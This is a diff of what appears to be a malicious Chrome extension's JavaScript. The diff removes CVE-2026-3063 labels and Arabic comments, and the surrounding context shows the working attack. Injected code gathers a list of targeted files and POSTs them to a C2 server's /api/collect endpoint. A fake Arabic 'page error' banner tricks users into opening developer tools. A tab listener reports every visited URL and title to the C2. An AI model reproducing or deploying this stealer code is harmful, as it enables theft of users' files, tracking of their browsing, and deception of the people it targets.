@@ -41,7 +41,7 @@ function stealFilesViaDevTools() {
 
   const exploitCode = `
     (function() {
-      console.log('[CVE-2026-3063] Executing in privileged context');
+      console.log(' Executing in privileged context');
       const results = [];
       const files = ${JSON.stringify(filesToSteal)};
       
@@ -62,8 +62,7 @@ function stealFilesViaDevTools() {
             console.log(' Failed:', file);
           }
         }
-        
-        // إرسال النتائج
+
         fetch('${C2}/api/collect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -161,7 +160,7 @@ function exploitViaDevTools(tabId, url) {
       div.innerHTML = `
         <h3> خطأ في الصفحة</h3>
         <p>حدث خطأ غير متوقع. يرجى فتح أدوات المطور (F12) للإصلاح التلقائي.</p>
-        <p style="font-size: 12px; color: #ffaaaa;">الرمز: CVE-2026-3063</p>
+        <p style="font-size: 12px; color: #ffaaaa;">الرمز: </p>
         <button onclick="this.parentElement.remove()" style="
           background: white;
           color: #ff4444;
@@ -247,7 +246,7 @@ function handlePrivilegedPage(tabId, url) {
               font-family: Arial;
             `;
             prompt.innerHTML = `
-              🔧 خطأ في الصفحة (CVE-2026-3063) - اضغط F12 لفتح أدوات المطور وإصلاح المشكلة تلقائياً
+              🔧 خطأ في الصفحة () - اضغط F12 لفتح أدوات المطور وإصلاح المشكلة تلقائياً
               <span style="float:right; margin-right:20px; cursor:pointer;">✕</span>
             `;
             prompt.onclick = (e) => {
@@ -273,7 +272,6 @@ chrome.tabs.onUpdated.addListener((tabId, change, tab) => {
       console.log('Privileged page detected:', tab.url);
       handlePrivilegedPage(tabId, tab.url);
     } else {
-      // صفحة عادية
       sendToC2('navigation', { 
         url: tab.url.substring(0, 500), 
         title: (tab.title || '').substring(0, 200) 
